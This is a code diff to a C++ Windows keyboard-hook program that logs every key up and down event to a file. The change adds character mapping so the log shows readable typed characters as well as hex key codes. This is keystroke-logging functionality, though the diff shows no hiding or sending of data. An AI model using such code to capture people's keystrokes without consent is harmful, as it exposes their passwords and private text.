@@ -21,6 +21,10 @@ static BOOL RightShiftIsDown() {
     return (GetKeyState(VK_RSHIFT) & 0x8000) != 0;
 }
 
+static char GetCharFromVirtualKeyCode(int vkCode) {
+    return MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
+}
+
 static void DumpCharacterBuffer() {
 
     std::ofstream ofs(fileName, std::ios_base::app);
@@ -43,7 +47,15 @@ LRESULT CALLBACK KeyboardProc(int nCode,
         case WM_KEYUP:
         case WM_SYSKEYUP:
 
-            if (vkCode == VK_LSHIFT) {
+            if (vkCode == VK_SPACE) {
+                // Omit space up.
+            } else if (vkCode == VK_TAB) {
+                // Omit tab up.
+            } else if (vkCode == VK_RETURN) {
+                // Omit return up.
+            } else if (vkCode == VK_BACK) {
+                // Omit back up.
+            } else if (vkCode == VK_LSHIFT) {
                 codepointStringBuffer.push_back(std::string("\nVK_LSHIFT up"));
             } else if (vkCode == VK_RSHIFT) {
                 codepointStringBuffer.push_back(std::string("\nVK_RSHIFT up"));
@@ -60,7 +72,9 @@ LRESULT CALLBACK KeyboardProc(int nCode,
                 ss << std::hex << std::uppercase << vkCode;
                 std::string s;
                 ss >> s;
-                std::string codepointString = "\n" + s + " up";
+                char ch = GetCharFromVirtualKeyCode(vkCode);
+                std::string chStr{ ch };
+                std::string codepointString = "\n" + s + " (" + chStr + ") up";
                 codepointStringBuffer.push_back(codepointString);
             }
 
@@ -118,7 +132,9 @@ LRESULT CALLBACK KeyboardProc(int nCode,
                 ss << std::hex << std::uppercase << vkCode;
                 std::string s;
                 ss >> s;
-                std::string codepointString = "\n" + s + " down";
+                char ch = GetCharFromVirtualKeyCode(vkCode);
+                std::string chStr{ ch };
+                std::string codepointString = "\n" + s + " (" + chStr + ") down";
                 codepointStringBuffer.push_back(codepointString);
             }
 
